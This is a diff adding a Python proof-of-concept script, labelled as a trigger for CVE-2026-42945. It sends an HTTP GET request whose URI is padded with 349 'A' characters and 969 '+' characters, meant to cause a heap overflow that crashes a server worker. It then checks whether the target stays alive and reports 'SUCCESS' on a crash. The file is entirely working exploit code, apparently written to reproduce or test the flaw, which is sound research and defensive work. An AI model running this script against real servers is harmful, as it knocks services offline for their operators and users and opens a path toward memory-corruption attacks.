@@ -1,0 +1,89 @@
+#!/usr/bin/env python3
+import argparse
+import socket
+import sys
+import time
+
+
+def trigger_overflow(host, port, num_plus=969, prefix_len=349):
+    payload = "A" * prefix_len + "+" * num_plus
+    uri = f"/api/{payload}"
+
+    s = socket.create_connection((host, port), timeout=10)
+    req = (
+        f"GET {uri} HTTP/1.1\r\n"
+        f"Host: localhost\r\n"
+        f"Connection: close\r\n"
+        f"\r\n"
+    ).encode("latin-1")
+
+    s.sendall(req)
+    try:
+        resp = s.recv(4096)
+        print(f"[*] Response ({len(resp)} bytes): {resp[:200]}")
+        s.close()
+        return False
+    except (ConnectionResetError, BrokenPipeError, OSError) as e:
+        print(f"[+] Worker crashed: {e}")
+        s.close()
+        return True
+    except socket.timeout:
+        print("[*] Timeout (worker may be hung)")
+        s.close()
+        return False
+
+
+def is_alive(host, port):
+    try:
+        s = socket.create_connection((host, port), timeout=3)
+        s.sendall(b"GET / HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n")
+        data = s.recv(100)
+        s.close()
+        return b"ok" in data
+    except Exception:
+        return False
+
+
+def main():
+    parser = argparse.ArgumentParser(description="CVE-2026-42945 overflow trigger")
+    parser.add_argument("--host", default="127.0.0.1")
+    parser.add_argument("--port", type=int, default=19321)
+    parser.add_argument("--plus-count", type=int, default=969,
+                        help="number of + chars to overflow")
+    parser.add_argument("--prefix-len", type=int, default=349,
+                        help="prefix padding before + chars")
+    parser.add_argument("--check-alive", action="store_true",
+                        help="only check if server is alive")
+    args = parser.parse_args()
+
+    if args.check_alive:
+        alive = is_alive(args.host, args.port)
+        print(f"[{'+' if alive else '-'}] Server {'alive' if alive else 'dead'}")
+        return 0 if alive else 1
+
+    print(f"[*] Target: {args.host}:{args.port}")
+    print(f"[*] Prefix: {args.prefix_len}, Plus: {args.plus_count}")
+
+    alive = is_alive(args.host, args.port)
+    if not alive:
+        print("[!] Server not responding")
+        return 1
+    print("[+] Server alive, sending overflow request...")
+
+    crashed = trigger_overflow(args.host, args.port, args.plus_count, args.prefix_len)
+
+    time.sleep(1)
+    alive = is_alive(args.host, args.port)
+    if crashed and not alive:
+        print("[+] SUCCESS: Worker crashed due to heap overflow")
+        return 0
+    elif crashed:
+        print("[*] Connection reset but worker respawned")
+        return 0
+    else:
+        print("[!] Server still alive — overflow may not have triggered")
+        return 1
+
+
+if __name__ == "__main__":
+    sys.exit(main())
